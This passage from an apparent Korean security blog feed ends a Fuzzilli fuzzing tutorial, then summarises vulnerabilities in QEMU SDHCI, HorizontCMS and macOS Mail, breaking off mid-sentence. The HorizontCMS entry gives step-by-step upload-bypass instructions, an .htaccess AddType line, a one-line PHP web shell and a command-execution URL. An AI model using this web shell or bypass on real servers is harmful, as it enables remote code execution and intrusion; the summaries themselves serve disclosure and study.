arg2)</span>    }    <span class="hljs-keyword">return</span> b.finalize() <span class="hljs-comment">// &#xB9C8;&#xBB34;&#xB9AC;</span></code></pre><p>&#xC704;&#xC758; &#xCF54;&#xB4DC;&#xB97C; IL&#xB85C; &#xBCF4;&#xBA74; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs swift">v0 &lt;- <span class="hljs-type">BeginPlainFunctionDefinition</span> -&gt; v1, v2    v3 &lt;- <span class="hljs-type">LoadProperty</span> v1, &apos;x&apos;    v4 &lt;- <span class="hljs-type">LoadProperty</span> v1, &apos;y&apos;    v5 &lt;- <span class="hljs-type">BinaryOperation</span> v3, &apos;+&apos;, v4    v6 &lt;- <span class="hljs-type">BinaryOperation</span> v5, &apos;*&apos;, v2    <span class="hljs-type">Return</span> v6<span class="hljs-type">EndPlainFunctionDefinition</span>v7 &lt;- <span class="hljs-type">LoadInteger</span> &apos;<span class="hljs-number">0</span>&apos;v8 &lt;- <span class="hljs-type">LoadInteger</span> &apos;<span class="hljs-number">1000</span>&apos;v9 &lt;- <span class="hljs-type">LoadInteger</span> &apos;<span class="hljs-number">1</span>&apos;<span class="hljs-type">BeginFor</span> v7, &apos;&lt;&apos;, v8, &apos;+&apos;, v9 -&gt; v10    v11 &lt;- <span class="hljs-type">LoadInteger</span> &apos;<span class="hljs-number">42</span>&apos;    v12 &lt;- <span class="hljs-type">LoadInteger</span> &apos;<span class="hljs-number">43</span>&apos;    v13 &lt;- <span class="hljs-type">CreateObject</span> [&apos;x&apos;:v11, &apos;y&apos;:v12]    v14 &lt;- <span class="hljs-type">CallFunction</span> v0, [v13, v10]<span class="hljs-type">EndFor</span></code></pre><p>&#xC774; IL&#xCF54;&#xB4DC;&#xB97C; javascript &#xCF54;&#xB4DC;&#xB85C; &#xBCC0;&#xD658;&#xD558;&#xBA74; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xC0DD;&#xC131;&#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs swift">function main() { <span class="hljs-comment">//v8 code prefix</span>function v0(v1,v2) {    const v3 = v1.x;    const v4 = v1.y;    const v5 = v3 + v4;    const v6 = v5 * v2;    <span class="hljs-keyword">return</span> v6;}<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> v10 = <span class="hljs-number">0</span>; v10 &lt; <span class="hljs-number">1000</span>; v10++) {    const v13 = {x:<span class="hljs-number">42</span>,y:<span class="hljs-number">43</span>};    const v14 = v0(v13,v10);}gc();                              <span class="hljs-comment">//</span>}                                  <span class="hljs-comment">//</span>%<span class="hljs-type">NeverOptimizeFunction</span>(main);      <span class="hljs-comment">// v8 code suffix</span>main();                            <span class="hljs-comment">//</span></code></pre><h2 id="Mutator"><a href="#Mutator" class="headerlink" title="Mutator"></a>Mutator</h2><h3 id="CodeGenMutator"><a href="#CodeGenMutator" class="headerlink" title="CodeGenMutator"></a>CodeGenMutator</h3><p>&#xAE30;&#xC874;&#xC758; &#xCF54;&#xB4DC;&#xC5D0; &#xC0C8;&#xB85C;&#xC6B4; &#xCF54;&#xB4DC;&#xB97C; &#xC0BD;&#xC785;&#xD558;&#xB294; Mutation&#xC744; &#xC9C4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">main</span>(<span class="hljs-params"></span>) </span>{    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">v0</span>(<span class="hljs-params">v1,v2</span>) </span>{        <span class="hljs-keyword">const</span> v3 = v1.x;        <span class="hljs-keyword">const</span> v4 = v1.y;        <span class="hljs-keyword">const</span> v5 = v3 + v4;        **v0 = v4;**        **<span class="hljs-keyword">const</span> v6 = [v0,v0,v1,v0];**        <span class="hljs-keyword">const</span> v7 = v5 * v2;        <span class="hljs-keyword">return</span> v7;    }    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> v11 = <span class="hljs-number">0</span>; v11 &lt; <span class="hljs-number">1000</span>; v11++) {        **<span class="hljs-keyword">let</span> v15 = <span class="hljs-built_in">Object</span>();        <span class="hljs-keyword">const</span> v16 = <span class="hljs-built_in">Object</span>;        <span class="hljs-keyword">const</span> v17 = v15--;**        <span class="hljs-keyword">const</span> v18 = {<span class="hljs-attr">x</span>:<span class="hljs-number">42</span>,<span class="hljs-attr">y</span>:<span class="hljs-number">43</span>};        <span class="hljs-keyword">const</span> v19 = v0(v18,v11);    }gc();}%NeverOptimizeFunction(main);main();</code></pre><h3 id="InputMutator"><a href="#InputMutator" class="headerlink" title="InputMutator"></a>InputMutator</h3><p>random&#xC73C;&#xB85C; Input&#xC5D0; &#xB300;&#xD574; &#xACE8;&#xB77C;&#xC11C; &#xB2E4;&#xB978; input&#xC73C;&#xB85C; &#xBC14;&#xAFD4;&#xC90D;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">main</span>(<span class="hljs-params"></span>) </span>{    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">v0</span>(<span class="hljs-params">v1,v2</span>) </span>{        <span class="hljs-keyword">const</span> v3 = v1.x;        <span class="hljs-keyword">const</span> v4 = v1.y;        <span class="hljs-keyword">const</span> v5 = v3 + v4;        **<span class="hljs-keyword">const</span> v6 = v5 ^ v2;**        <span class="hljs-keyword">return</span> v6;    }    <span class="hljs-keyword">for</span> (**<span class="hljs-keyword">let</span> v10 = <span class="hljs-number">9007199254740992</span>;** v10 &lt; <span class="hljs-number">1000</span>; v10++) {        <span class="hljs-keyword">const</span> v13 = {<span class="hljs-attr">x</span>:<span class="hljs-number">42</span>,<span class="hljs-attr">a</span>:<span class="hljs-number">43</span>};        <span class="hljs-keyword">const</span> v14 = v0(v13,v10);    }    gc();    }%NeverOptimizeFunction(main);main();</code></pre><h3 id="OperationMutator"><a href="#OperationMutator" class="headerlink" title="OperationMutator"></a>OperationMutator</h3><p>Operation&#xC744; &#xD558;&#xB098; &#xACE8;&#xB77C;&#xC11C; mutate &#xD574;&#xC90D;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">main</span>(<span class="hljs-params"></span>) </span>{<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">v0</span>(<span class="hljs-params">v1,v2</span>) </span>{    <span class="hljs-keyword">const</span> v3 = v1.x;    <span class="hljs-keyword">const</span> v4 = v1.y;    <span class="hljs-keyword">const</span> v5 = v3 + v4;    <span class="hljs-keyword">const</span> v6 = v5 * v2;    <span class="hljs-keyword">return</span> v6;}<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> v10 = <span class="hljs-number">0</span>; v10 &lt; <span class="hljs-number">1000</span>; **v10 = v10 &amp;&amp; <span class="hljs-number">1</span>**) {    <span class="hljs-keyword">const</span> v13 = {<span class="hljs-attr">toString</span>:<span class="hljs-number">42</span>,<span class="hljs-attr">y</span>:<span class="hljs-number">43</span>};    <span class="hljs-keyword">const</span> v14 = v0(v13,v10);}gc();}%NeverOptimizeFunction(main);main();</code></pre><h3 id="CombineMutator"><a href="#CombineMutator" class="headerlink" title="CombineMutator"></a>CombineMutator</h3><p>corpus&#xC5D0; &#xC788;&#xB294; &#xC694;&#xC18C; &#xC911; &#xD558;&#xB098;&#xB97C; &#xACE8;&#xB77C;&#xC11C; &#xCF54;&#xB4DC;&#xB97C; &#xCD94;&#xAC00;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">main</span>(<span class="hljs-params"></span>) </span>{    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">v0</span>(<span class="hljs-params">v1,v2</span>) </span>{        <span class="hljs-keyword">const</span> v3 = v1.x;        <span class="hljs-keyword">const</span> v4 = v1.y;        <span class="hljs-keyword">const</span> v5 = v3 + v4;        <span class="hljs-keyword">const</span> v6 = v5 * v2;        <span class="hljs-keyword">return</span> v6;    }    **<span class="hljs-keyword">const</span> v11 = <span class="hljs-built_in">Object</span>();**    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> v12 = <span class="hljs-number">0</span>; v12 &lt; <span class="hljs-number">1000</span>; v12++) {        <span class="hljs-keyword">const</span> v15 = {<span class="hljs-attr">x</span>:<span class="hljs-number">42</span>,<span class="hljs-attr">y</span>:<span class="hljs-number">43</span>};        <span class="hljs-keyword">const</span> v16 = v0(v15,v12);    }    gc();}%NeverOptimizeFunction(main);main();</code></pre><h3 id="JITStressMutator"><a href="#JITStressMutator" class="headerlink" title="JITStressMutator"></a>JITStressMutator</h3><p>&#xC874;&#xC7AC;&#xD558;&#xB294; &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">main</span>(<span class="hljs-params"></span>) </span>{    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">v0</span>(<span class="hljs-params">v1,v2</span>) </span>{        <span class="hljs-keyword">const</span> v3 = v1.x;        <span class="hljs-keyword">const</span> v4 = v1.y;        <span class="hljs-keyword">const</span> v5 = v3 + v4;        <span class="hljs-keyword">const</span> v6 = v5 * v2;        <span class="hljs-keyword">return</span> v6;    }    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> v10 = <span class="hljs-number">0</span>; v10 &lt; <span class="hljs-number">1000</span>; v10++) {        <span class="hljs-keyword">const</span> v13 = {<span class="hljs-attr">x</span>:<span class="hljs-number">42</span>,<span class="hljs-attr">y</span>:<span class="hljs-number">43</span>};        <span class="hljs-keyword">const</span> v14 = v0(v13,v10);    }    **<span class="hljs-keyword">const</span> v15 = <span class="hljs-built_in">Object</span>;    <span class="hljs-keyword">const</span> v17 = v0(<span class="hljs-number">1000</span>,<span class="hljs-built_in">Object</span>);**    gc();}%NeverOptimizeFunction(main);main();</code></pre><h1 id="&#xB9C8;&#xCE58;&#xBA70;"><a href="#&#xB9C8;&#xCE58;&#xBA70;" class="headerlink" title="&#xB9C8;&#xCE58;&#xBA70;"></a>&#xB9C8;&#xCE58;&#xBA70;</h1><p>Fuzzilli&#xC5D0; &#xB300;&#xD574; &#xAC04;&#xB2E8;&#xD558;&#xAC8C; &#xC54C;&#xC544;&#xBCF4;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;.<br>&#xC704;&#xC5D0;&#xC11C; &#xC18C;&#xAC1C;&#xD55C; mutator &#xC678;&#xC5D0;&#xB3C4; &#xC5EC;&#xB7EC; mutator&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xACE0; &#xC0C8;&#xB85C;&#xC6B4; mutator&#xB97C; &#xB9CC;&#xB4E4;&#xAC70;&#xB098; &#xC0C8;&#xB85C;&#xC6B4; &#xC18D;&#xC131;&#xB4E4;&#xC744; &#xCD94;&#xAC00;&#xD574;&#xC8FC;&#xBA74;&#xC11C; &#xD37C;&#xC800;&#xB97C; &#xAC1C;&#xC120;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB610;&#xD55C; &#xAE30;&#xC874;&#xC758; javascript &#xD30C;&#xC77C;&#xC744; FuzzIL&#xB85C; &#xBCC0;&#xD658;&#xD574; corpus&#xB97C; &#xAD6C;&#xC131;&#xD574;&#xC8FC;&#xB294; &#xBC29;&#xBC95;&#xC744; &#xD1B5;&#xD574; &#xBC1C;&#xC804;&#xC2DC;&#xD0AC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>Fuzzilli&#xB97C; &#xC798; &#xBD84;&#xC11D;&#xD574;&#xC11C; &#xAC1C;&#xC120;&#xD55C;&#xB2E4;&#xBA74; js engine&#xC5D0; &#xB300;&#xD574; &#xD6A8;&#xC728;&#xC801;&#xC73C;&#xB85C; &#xD37C;&#xC9D5; &#xD560; &#xC218; &#xC788;&#xB2E4;&#xACE0; &#xC0DD;&#xAC01;&#xD569;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>insu</tag>
      
      <tag>fuzzing</tag>
      
      <tag>system</tag>
      
      <tag>fuzzilli</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-3409: QEMU Heap overflow in SDHCI</title>
    <link href="/2021/04/07/fabu1ous/2021-04-07/"/>
    <url>/2021/04/07/fabu1ous/2021-04-07/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://starlabs.sg/advisories/21-3409/">CVE-2021-3409</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>QEMU 5.2.50</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>QEMU 5.2.50 &#xCF54;&#xB4DC;&#xC758; SDHCI(Secure Digital Host Controller Interface) &#xCEF4;&#xD3EC;&#xB10C;&#xD2B8;&#xB294; Heap buffer overflow &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. SDHCI&#xB294; &#xBE44;&#xD718;&#xBC1C;&#xC131; &#xBA54;&#xBAA8;&#xB9AC; &#xCE74;&#xB4DC; &#xD3EC;&#xB9F7;&#xC778; SD&#xC758; &#xCEE8;&#xD2B8;&#xB864;&#xB7EC; &#xC5D0;&#xBBAC;&#xB808;&#xC774;&#xC158;&#xC785;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python">begin = s-&gt;data_count;         <span class="hljs-keyword">if</span> ((length + begin) &lt; block_size) {             s-&gt;data_count = length + begin;             length = <span class="hljs-number">0</span>;          } <span class="hljs-keyword">else</span> {             s-&gt;data_count = block_size; // [1]             length -= block_size - begin;         }         dma_memory_write(s-&gt;dma_as, dscr.addr,                          &amp;s-&gt;fifo_buffer[begin],                          s-&gt;data_count - begin); // [2]         dscr.addr += s-&gt;data_count - begin;</code></pre><p>&#xC704; &#xCF54;&#xB4DC;&#xB294; &#xD568;&#xC218; <code>sdhci_do_adma</code>&#xC758; &#xC77C;&#xBD80;&#xC785;&#xB2C8;&#xB2E4;. &#xD568;&#xC218; <code>sdhci_do_adma</code>&#xB294; SDHCI&#xC640; Guest system memory(DMA buffer) &#xAC04;&#xC5D0; &#xB370;&#xC774;&#xD130; &#xD1B5;&#xC2E0;&#xC744; &#xB2F4;&#xB2F9;&#xD569;&#xB2C8;&#xB2E4;. &#xBE14;&#xB85D; &#xBC84;&#xD37C;&#xB97C; &#xC0AC;&#xC6A9;&#xD55C; &#xB370;&#xC774;&#xD130; &#xD1B5;&#xC2E0;&#xC774; &#xC774;&#xB8E8;&#xC5B4;&#xC9C8; &#xB54C; &#xBE14;&#xB85D; &#xBC84;&#xD37C;&#xC5D0; &#xB4E4;&#xC5B4;&#xAC08; &#xB370;&#xC774;&#xD130; &#xD06C;&#xAE30;&#xB97C; &#xACC4;&#xC0B0;&#xD558;&#xB294; &#xC2DD;&#xC740; <code>block_size - s-&gt;data_count</code>&#xC785;&#xB2C8;&#xB2E4;. <code>s-&gt;data_count</code>&#xB294; &#xD604;&#xC7AC; &#xBE14;&#xB85D; &#xBC84;&#xD37C;&#xC758; &#xC624;&#xD504;&#xC14B;&#xC744;, <code>block_size</code>&#xB294; <code>blksize</code>(0x4 &#xC624;&#xD504;&#xC14B;&#xC758; &#xB808;&#xC9C0;&#xC2A4;&#xD130; &#xAC12;)&#xB97C; &#xB2F4;&#xACE0; &#xC788;&#xACE0; &#xB370;&#xC774;&#xD130; &#xD1B5;&#xC2E0;&#xC774; &#xC774;&#xB8E8;&#xC5B4;&#xC9C0;&#xB294; &#xB3C4;&#xC911; <code>blksize</code>&#xC758; &#xAC12;&#xC744; &#xBCC0;&#xACBD;&#xD560; &#xC218; &#xC788;&#xC5B4; heap overflow &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC545;&#xC6A9;&#xD574; Geust system&#xC744; &#xB300;&#xC0C1;&#xC73C;&#xB85C; &#xC815;&#xBCF4; &#xB178;&#xCD9C;, &#xB370;&#xC774;&#xD130; &#xCD94;&#xAC00; &#xBC0F; &#xC218;&#xC815;, DoS &#xACF5;&#xACA9;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>Fabu1ous</tag>
      
      <tag>qemu</tag>
      
      <tag>heap overflow</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] HorizontCMS 원격 코드 실행 취약점</title>
    <link href="/2021/04/06/l0ch/2021-04-06/"/>
    <url>/2021/04/06/l0ch/2021-04-06/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://infosecwriteups.com/bughunt-authenticated-rce-found-in-horizontcms-part-2-php-filetype-bypass-4580176223eb">[BugHunt] Authenticated RCE found in HorizontCMS &#x2014; Part 2 (PHP Filetype Bypass)</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>HorizontCMS</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xC624;&#xD508;&#xC18C;&#xC2A4; &#xCEE8;&#xD150;&#xCE20; &#xAD00;&#xB9AC; &#xC2DC;&#xC2A4;&#xD15C;&#xC778; HorizontCMS&#xC5D0;&#xC11C; &#xAE30;&#xC874; &#xD30C;&#xC77C; &#xC5C5;&#xB85C;&#xB4DC; &#xCDE8;&#xC57D;&#xC810;(CVE-2020&#x2013;27387) &#xD328;&#xCE58;&#xC5D0; &#xB300;&#xD55C; &#xC6B0;&#xD68C;&#xAC00; &#xBC1C;&#xACAC;&#xB418;&#xC5B4; &#xC138;&#xBD80; &#xC815;&#xBCF4;&#xAC00; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xAE30;&#xC874; &#xD30C;&#xC77C; &#xC5C5;&#xB85C;&#xB4DC; &#xCDE8;&#xC57D;&#xC810;&#xC740; <code>.php</code>, <code>.php5</code>, <code>.php7</code>, <code>.phtml</code>, <code>.inc</code> &#xC640; &#xAC19;&#xC740; &#xD655;&#xC7A5;&#xBA85;&#xC774; &#xD3EC;&#xD568;&#xB41C; &#xD30C;&#xC77C; &#xC5C5;&#xB85C;&#xB4DC;&#xB97C; &#xC81C;&#xD55C;&#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xD328;&#xCE58;&#xB418;&#xC5C8;&#xC9C0;&#xB9CC; &#xC124;&#xC815; &#xD30C;&#xC77C;&#xC778; <code>.htaccess</code> &#xD544;&#xD130;&#xB9C1;&#xC744; &#xD558;&#xC9C0; &#xC54A;&#xC544; PHP file type&#xC744; &#xBCC0;&#xACBD;&#xD55C; &#xC6B0;&#xD68C; &#xACF5;&#xACA9;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC774;&#xC6A9;&#xD574; &#xC784;&#xC758; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xB294; &#xBC29;&#xBC95;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>admin &#xD398;&#xC774;&#xC9C0;&#xC758; Media &#x2192; Files&#xC5D0;&#xC11C; <code>test2.htaccess</code> &#xD30C;&#xC77C;&#xC744; &#xC5C5;&#xB85C;&#xB4DC;&#xD569;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xD30C;&#xC77C;&#xC758; &#xB0B4;&#xC6A9;&#xC740; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.<ul><li><code>AddType application/x-httpd-php .exp</code></li></ul></li><li>&#xD30C;&#xC77C; rename &#xAE30;&#xB2A5;&#xC744; &#xC774;&#xC6A9;&#xD574; <code>test2.htaccess</code> &#xD30C;&#xC77C;&#xC758; &#xC774;&#xB984;&#xC744; <code>.htaccess</code>&#xB85C; &#xBCC0;&#xACBD;&#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xC784;&#xC758; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xD574;&#xC8FC;&#xB294; &#xB0B4;&#xC6A9;&#xC774; &#xD3EC;&#xD568;&#xB41C; <code>test2.php</code> &#xD30C;&#xC77C;&#xC744; &#xC5C5;&#xB85C;&#xB4DC; &#xD55C; &#xB4A4; &#xD30C;&#xC77C; &#xC774;&#xB984;&#xC744; <code>test.exp</code> &#xB85C; &#xBCC0;&#xACBD;&#xD569;&#xB2C8;&#xB2E4;.<ul><li><code>&lt;?php system($_GET[&apos;cmd&apos;]); ?&gt;</code></li></ul></li><li>1, 2&#xC5D0;&#xC11C; &#xC5C5;&#xB85C;&#xB4DC;&#xD55C; <code>.htaccess</code> &#xB85C; &#xC778;&#xD574; <code>.exp</code> &#xD655;&#xC7A5;&#xC790;&#xAC00; php&#xB85C; &#xC2E4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; <code>test.exp</code>&#xC5D0; &#xC811;&#xADFC;&#xD574; &#xC784;&#xC758; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ol><pre><code class="hljs cpp">http:<span class="hljs-comment">//&lt;HorizontCMS IP&gt;/storage/test.exp?cmd=id</span></code></pre><p>&#xCDE8;&#xC57D;&#xC810; &#xC81C;&#xBCF4;&#xC790;&#xB294; &#xC545;&#xC131; &#xD50C;&#xB7EC;&#xADF8;&#xC778;&#xC744; &#xC545;&#xC6A9;&#xD55C; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589; &#xCDE8;&#xC57D;&#xC810;&#xC758; &#xAD00;&#xB828; &#xC815;&#xBCF4; &#xB610;&#xD55C; &#xACF5;&#xAC1C;&#xD558;&#xC600;&#xC73C;&#xBA70; <a href="https://infosecwriteups.com/bughunt-authenticated-rce-found-in-horizontcms-part-1-malicious-plugins-72846f4ab6fe">https://infosecwriteups.com/bughunt-authenticated-rce-found-in-horizontcms-part-1-malicious-plugins-72846f4ab6fe</a> &#xC5D0;&#xC11C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>bypass</tag>
      
      <tag>rce</tag>
      
      <tag>php</tag>
      
      <tag>L0ch</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] macOS Mail 제로 클릭 취약점</title>
    <link href="/2021/04/05/idioth/2021-04-05/"/>
    <url>/2021/04/05/idioth/2021-04-05/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://mikko-kenttala.medium.com/zero-click-vulnerability-in-apples-macos-mail-59e0c14b106c">Zero click vulnerability in Apple&#x2019;s macOS Mail</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>macOS Mojave &lt; 10.14.6</li><li>macOS High Sierra &lt; 10.13.6</li><li>macOS Catalina &lt; 10.15.5</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Apple Mail&#xC5D0;&#xC11C; Mail&#xC758; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; &#xD658;&#xACBD; &#xB0B4;&#xBD80;&#xC5D0; &#xD30C;&#xC77C;&#xC744; &#xCD94;&#xAC00;&#xD558;&#xAC70;&#xB098; &#xC218;&#xC815;&#xD560; &#xC218; &#xC788;&#xB294; zero click &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD1B5;&#xD574; &#xD574;&#xCEE4;&#xB294; &#xBE44;&#xBC00;&#xBC88;&#xD638; &#xCD08;&#xAE30;&#xD654;&#xB97C; &#xD1B5;&#xD574; &#xACC4;&#xC815;&#xC744; &#xD0C8;&#xCDE8;&#xD560; &#xC218; &#xC788;&#xB294; mail redirect &#xB4F1;&#xC744; &#xD3EC;&#xD568;&#xD558;&#xC5EC; &#xBA54;&#xC77C; &#xC124;&#xC815;&#xC744; &#xC218;&#xC815;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xBA54;&#xC77C;&#xC5D0;&#xB294; &#xB2E4;&#xB978; &#xBA54;&#xC77C; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC555;&#xCD95;&#xD55C; &#xCCA8;&#xBD80;&#xD30C;&#xC77C;&#xC744; &#xC790;&#xB3D9;&#xC73C;&#xB85C; &#xC555;&#xCD95; &#xD574;&#xC81C;&#xD560; &#xC218; &#xC788;&#xB294; &#xAE30;&#xB2A5;&#xC774; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xCCA8;&#xBD80;&#xD30C;&#xC77C;&#xB85C; &#xD3F4;&#xB354;&#xB97C; &#xCD94;&#xAC00;&#xD558;&#xBA74; &#xC790;&#xB3D9;&#xC801;&#xC73C;&#xB85C; <code>x-mac-auto-archive=yes</code> header&#xB85C; zip &#xC555;&#xCD95;&#xB429;&#xB2C8;&#xB2E4;. &#xB2E4;&#xB978; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xD574;&#xB2F9; &#xB9E4;&#xC77C;&#xC744; &#xBC1B;&#xC73C;&#xBA74; &#xC555;&#xCD95; &#xCCA8;&#xBD80; &#xD30C;&#xC77C;&#xC740; &#xC790;&#xB3D9;&#xC801;&#xC73C;&#xB85C; &#xC555;&#xCD95;&#xC774; &#xD574;&#xC81C;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC545;&#xC6A9;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC120; zip &#xD30C;&#xC77C; 2&#xAC1C;&#xAC00; &#xD544;&#xC694;&#xD569;&#xB2C8;&#xB2E4;. &#xCCAB;&#xBC88;&#xC9F8; zip &#xD30C;&#xC77C;&#xC740; <code>$HOME/Library/Mail</code>&#xC758; &#xC2EC;&#xBCFC;&#xB9AD; &#xB9C1;&#xD06C; &#xD30C;&#xC77C;&#xACFC; <code>1.txt</code>&#xD30C;&#xC77C;&#xC744; &#xD3EC;&#xD568;&#xD558;&#xACE0; &#xB450;&#xBC88;&#xC9F8; zip &#xD30C;&#xC77C;&#xC740; <code>$HOME/Library/Mail</code>&#xC5D0; &#xC218;&#xC815;&#xD558;&#xB824;&#xB294; &#xAC83;&#xC744; &#xD3EC;&#xD568;&#xD569;&#xB2C8;&#xB2E4;. &#xCCAB;&#xBC88;&#xC9F8; zip &#xD30C;&#xC77C;&#xC740; <code>$TMPDIR/com.apple.mail/bom/</code>&#xC5D0; &#xC555;&#xCD95; &#xD574;&#xC81C;&#xB429;&#xB2C8;&#xB2E4;. <code>filename=1.txt.zip</code> &#xD5E4;&#xB354;&#xB97C; &#xAE30;&#xBC18;&#xC73C;&#xB85C; <code>1.txt</code> &#xD30C;&#xC77C;&#xC740; &#xBA54;&#xC77C; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xC5D0; &#xBCF5;&#xC0AC;&#xB429;&#xB2C8;&#xB2E4;. &#xADF8; &#xD6C4; &#xB450;&#xBC88;&#xC9F8; zip &#xD30C;&#xC77C;&#xC744; &#xD1B5;&#xD574; &#xBA54;&#xC77C; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC758; rule&#xC744; overwrite &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD1B5;&#xD574; &#xD574;&#xCEE4;&#xB294; <code>$HOME/Library/Mail</code> &#xB514;&#xB809;&#xD130;&#xB9AC;&#xC758; &#xBAA8;&#xB4E0; &#xD30C;&#xC77C;&#xC5D0; &#xC4F0;&#xAE30; &#xAD8C;&#xD55C;&#xC744; &#xAC00;&#xC9C8; &#xC218; &#xC788;&#xC73C;&#xBA70; &#xBBFC;&#xAC10;&#xD55C; &#xB370;&#xC774;&#xD130; &#xB204;&#xCD9C;, &#xC545;&#xC758;&#xC801;&#xC778; &#xC124;&#xC815;&#xC774; &#xAC00;&#xB2A5;&#xD558;&#xBA70; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; 